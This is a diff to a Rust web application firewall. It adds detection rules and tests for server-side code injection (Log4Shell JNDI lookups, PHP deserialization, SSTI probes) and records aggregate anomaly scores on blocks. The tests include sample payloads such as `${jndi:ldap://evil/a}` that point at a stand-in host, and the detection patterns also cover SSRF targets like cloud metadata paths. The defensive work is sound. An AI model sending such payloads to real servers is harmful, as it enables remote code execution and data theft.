@@ -6,8 +6,9 @@
 //! (path + query), and header values. `RegexSet` matches every pattern in a single
 //! pass and uses `aho-corasick` internally for literal prefiltering, so adding more
 //! signatures stays cheap. The starter ruleset covers the classic signature classes
-//! (SQLi / XSS / path traversal & file-inclusion wrappers / OS command injection /
-//! protocol anomalies); it is **not** OWASP-CRS-complete — the 100%-Rust rule (no
+//! (SQLi / XSS / path traversal & file-inclusion wrappers / OS command injection / SSRF /
+//! server-side code & expression injection / protocol anomalies); it is **not**
+//! OWASP-CRS-complete — the 100%-Rust rule (no
 //! Coraza/ModSecurity FFI) means CRS coverage is reached by porting rules into this
 //! engine, never by linking a foreign one. Rules are operator-extensible: [`Waf::new`]
 //! takes any rule iterator, so a caller can extend [`starter_rules`] with its own — and
@@ -59,13 +60,18 @@ pub enum WafCategory {
 	/// internal/loopback/metadata URL. IP-free to detect (the *URL value* is in the
 	/// request), so it survives the loss of client IP and ports directly over Tor.
 	Ssrf,
+	/// Server-side code / expression injection: payloads that drive the server to evaluate
+	/// attacker-controlled code — Log4Shell-style `${jndi:…}` JNDI lookups, server-side
+	/// template-injection probes, and serialized-object (deserialization) gadgets. Pure
+	/// request-value inspection, so it ports over Tor unchanged.
+	CodeInjection,
 	/// Malformed or anomalous protocol input (control chars, header injection).
 	ProtocolAnomaly,
 }
 
 impl WafCategory {
 	/// Every category, in [`index`](Self::index) order — for iterating per-category metrics.
-	pub const ALL: [WafCategory; 6] = [Self::Sqli, Self::Xss, Self::PathTraversal, Self::CommandInjection, Self::Ssrf, Self::ProtocolAnomaly];
+	pub const ALL: [WafCategory; 7] = [Self::Sqli, Self::Xss, Self::PathTraversal, Self::CommandInjection, Self::Ssrf, Self::CodeInjection, Self::ProtocolAnomaly];
 
 	/// A stable, lowercase name for logs and security events.
 	#[must_use]
@@ -76,6 +82,7 @@ impl WafCategory {
 			Self::PathTraversal => "path_traversal",
 			Self::CommandInjection => "command_injection",
 			Self::Ssrf => "ssrf",
+			Self::CodeInjection => "code_injection",
 			Self::ProtocolAnomaly => "protocol_anomaly",
 		}
 	}
@@ -89,7 +96,7 @@ impl WafCategory {
 	#[must_use]
 	pub const fn weight(self) -> u32 {
 		match self {
-			Self::Sqli | Self::CommandInjection | Self::Ssrf | Self::PathTraversal => 5,
+			Self::Sqli | Self::CommandInjection | Self::Ssrf | Self::PathTraversal | Self::CodeInjection => 5,
 			Self::Xss => 4,
 			Self::ProtocolAnomaly => 3,
 		}
@@ -105,7 +112,8 @@ impl WafCategory {
 			Self::PathTraversal => 2,
 			Self::CommandInjection => 3,
 			Self::Ssrf => 4,
-			Self::ProtocolAnomaly => 5,
+			Self::CodeInjection => 5,
+			Self::ProtocolAnomaly => 6,
 		}
 	}
 }
@@ -141,6 +149,12 @@ pub struct WafMatch {
 	pub category: WafCategory,
 	/// Which part of the request matched (e.g. `"target"`, `"header:user-agent"`).
 	pub location: String,
+	/// When this match is the representative of an anomaly-**scoring** block (see
+	/// [`Waf::scoring_threshold`]), the aggregate [`anomaly_score`] of every signature the
+	/// request tripped — the number that crossed the threshold. `None` for a first-match
+	/// block, for the multiple-encoding hard block, and for the individual matches returned
+	/// by [`Waf::inspect_all`].
+	pub score: Option<u32>,
 }
 
 /// The compiled WAF: a [`RegexSet`] plus index-aligned rule metadata.
@@ -295,7 +309,7 @@ impl Waf {
 	fn match_raw(&self, haystack: &str, location: &str) -> Option<WafMatch> {
 		self.set.matches(haystack).iter().filter(|&idx| self.enabled[idx]).min().map(|idx| {
 			let (rule_id, category) = self.meta[idx];
-			WafMatch { rule_id, category, location: location.to_owned() }
+			WafMatch { rule_id, category, location: location.to_owned(), score: None }
 		})
 	}
 
@@ -325,6 +339,7 @@ impl Waf {
 				rule_id: MULTI_ENCODING_RULE_ID,
 				category: WafCategory::ProtocolAnomaly,
 				location: location.to_owned(),
+				score: None,
 			});
 		}
 		// 4. Match the decoded form, but only when normalization actually changed it
@@ -376,12 +391,19 @@ impl Waf {
 		if self.block_multi_encoded && let Some(m) = matches.iter().find(|m| m.rule_id == MULTI_ENCODING_RULE_ID) {
 			return Verdict::Block(m.clone());
 		}
-		if anomaly_score(&matches) < threshold {
+		let total = anomaly_score(&matches);
+		if total < threshold {
 			return Verdict::Allow;
 		}
 		// Name the most severe rule that drove the block; on a weight tie keep the earliest
 		// (inspection order is method → target → query → headers, lowest rule index first).
-		let dominant = matches.iter().enumerate().max_by_key(|(i, m)| (m.category.weight(), std::cmp::Reverse(*i))).map(|(_, m)| m.clone());
+		// Tag it with the aggregate score that crossed the threshold so a scored block is
+		// distinguishable downstream from a single-signature one.
+		let dominant = matches.iter().enumerate().max_by_key(|(i, m)| (m.category.weight(), std::cmp::Reverse(*i))).map(|(_, m)| {
+			let mut m = m.clone();
+			m.score = Some(total);
+			m
+		});
 		dominant.map_or(Verdict::Allow, Verdict::Block)
 	}
 
@@ -391,7 +413,7 @@ impl Waf {
 	fn match_all_raw(&self, haystack: &str, location: &str, out: &mut Vec<WafMatch>) {
 		for idx in self.set.matches(haystack).iter().filter(|&idx| self.enabled[idx]) {
 			let (rule_id, category) = self.meta[idx];
-			out.push(WafMatch { rule_id, category, location: location.to_owned() });
+			out.push(WafMatch { rule_id, category, location: location.to_owned(), score: None });
 		}
 	}
 
@@ -405,7 +427,7 @@ impl Waf {
 		self.match_all_raw(raw, location, out);
 		let norm = normalize(raw, plus_is_space);
 		if self.block_multi_encoded && norm.decode_passes >= 2 {
-			out.push(WafMatch { rule_id: MULTI_ENCODING_RULE_ID, category: WafCategory::ProtocolAnomaly, location: location.to_owned() });
+			out.push(WafMatch { rule_id: MULTI_ENCODING_RULE_ID, category: WafCategory::ProtocolAnomaly, location: location.to_owned(), score: None });
 			return;
 		}
 		if norm.decoded != raw {
@@ -558,6 +580,11 @@ pub fn starter_rules() -> Vec<Rule> {
 		Rule { id: "ssrf_cloud_metadata_path", category: WafCategory::Ssrf, pattern: r"(?i)/(latest/meta-data|computeMetadata/v1|metadata/instance)\b" },
 		Rule { id: "ssrf_internal_scheme", category: WafCategory::Ssrf, pattern: r"(?i)\b(gopher|dict|file)://" },
 		Rule { id: "ssrf_loopback_url", category: WafCategory::Ssrf, pattern: r"(?i)\b(https?|ftp)://(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])" },
+		// --- Server-side code / expression injection (value inspection; no client IP needed) ---
+		Rule { id: "code_log4shell_jndi", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{jndi:" },
+		Rule { id: "code_log4j_nested_lookup", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{[^}]{0,30}\$\{" },
+		Rule { id: "code_php_object_inject", category: WafCategory::CodeInjection, pattern: r#"(?i)\b[oc]:\d+:"[a-z0-9_\\]+":\d+:\{"# },
+		Rule { id: "code_ssti_arithmetic", category: WafCategory::CodeInjection, pattern: r"\$\{\s*\d+\s*[*]\s*\d+\s*\}" },
 		// --- Protocol anomalies ---
 		Rule { id: "anomaly_null_byte", category: WafCategory::ProtocolAnomaly, pattern: r"(\x00|%00)" },
 		Rule { id: "anomaly_crlf", category: WafCategory::ProtocolAnomaly, pattern: r"(\r\n|%0d%0a|%0a|%0d)" },
@@ -805,7 +832,7 @@ mod tests {
 		let waf = Waf::starter().inspect_body_up_to(4096);
 		let mut body = vec![0xff, 0xfe, 0x00];
 		body.extend_from_slice(b"<script>");
-		assert_eq!(waf.inspect_body(&body), Verdict::Block(WafMatch { rule_id: "xss_script_tag", category: WafCategory::Xss, location: "body".to_owned() }));
+		assert_eq!(waf.inspect_body(&body), Verdict::Block(WafMatch { rule_id: "xss_script_tag", category: WafCategory::Xss, location: "body".to_owned(), score: None }));
 	}
 
 	#[test]
@@ -866,6 +893,35 @@ mod tests {
 		p.headers.insert("user-agent", "<script>x</script>".parse().unwrap());
 		let v = waf.inspect(&p);
 		assert_eq!(blocked(&v).category, WafCategory::Sqli);
+	}
+
+	#[test]
+	fn scoring_block_carries_aggregate_score() {
+		// SQLi (5) in the query + XSS (4) in a header = 9. The block's representative match
+		// reports that aggregate so a scored block is observable as such.
+		let waf = Waf::starter().scoring_threshold(8);
+		let mut p = parts("GET", "/items?q=1%20OR%201=1");
+		p.headers.insert("user-agent", "<script>x</script>".parse().unwrap());
+		let v = waf.inspect(&p);
+		assert_eq!(blocked(&v).score, Some(9));
+	}
+
+	#[test]
+	fn first_match_block_has_no_score() {
+		// First-match mode (no threshold) never attaches an aggregate score.
+		let waf = Waf::starter();
+		let v = waf.inspect(&parts("GET", "/items?q=1%20UNION%20SELECT%20pw"));
+		assert_eq!(blocked(&v).score, None);
+	}
+
+	#[test]
+	fn scoring_mode_multi_encoding_hard_block_has_no_score() {
+		// The multiple-encoding guard is an independent hard block, not a score-driven one,
+		// so it carries no aggregate score even in scoring mode.
+		let waf = Waf::starter().scoring_threshold(1000);
+		let v = waf.inspect(&parts("GET", "/x?p=a%252e%252e%252fb"));
+		assert_eq!(blocked(&v).rule_id, MULTI_ENCODING_RULE_ID);
+		assert_eq!(blocked(&v).score, None);
 	}
 
 	#[test]
@@ -965,9 +1021,29 @@ mod tests {
 	fn ssrf_category_metadata_is_stable() {
 		assert_eq!(WafCategory::Ssrf.name(), "ssrf");
 		assert_eq!(WafCategory::ALL[WafCategory::Ssrf.index()], WafCategory::Ssrf);
-		// The index is still a bijection over the (now six) categories.
+		// The index is still a bijection over the (now seven) categories.
 		for cat in WafCategory::ALL {
 			assert_eq!(WafCategory::ALL[cat.index()], cat);
+		}
+	}
+
+	#[test]
+	fn code_injection_rules_match() {
+		let waf = Waf::starter();
+		// Log4Shell and its nested-lookup obfuscation, a PHP unserialize gadget, and the
+		// classic ${7*7} SSTI probe all attribute to the CodeInjection class.
+		assert_eq!(waf.inspect_str("x=${jndi:ldap://evil/a}", "query").map(|m| m.category), Some(WafCategory::CodeInjection));
+		assert_eq!(waf.inspect_str("x=${${lower:j}ndi:rmi://evil}", "query").unwrap().rule_id, "code_log4j_nested_lookup");
+		assert_eq!(waf.inspect_str(r#"data=O:8:"Exploit":1:{s:3:"cmd"}"#, "query").unwrap().rule_id, "code_php_object_inject");
+		assert_eq!(waf.inspect_str("tpl=${7*7}", "query").unwrap().rule_id, "code_ssti_arithmetic");
+	}
+
+	#[test]
+	fn code_injection_rules_keep_false_positives_low() {
+		// Benign requests mentioning braces/dollars or the word "code" must still pass.
+		let waf = Waf::starter();
+		for uri in ["/articles/json-${schema}-guide", "/pricing?total=7", "/docs/php-serialization-explained", "/blog/clean-code-tips"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
 		}
 	}
 
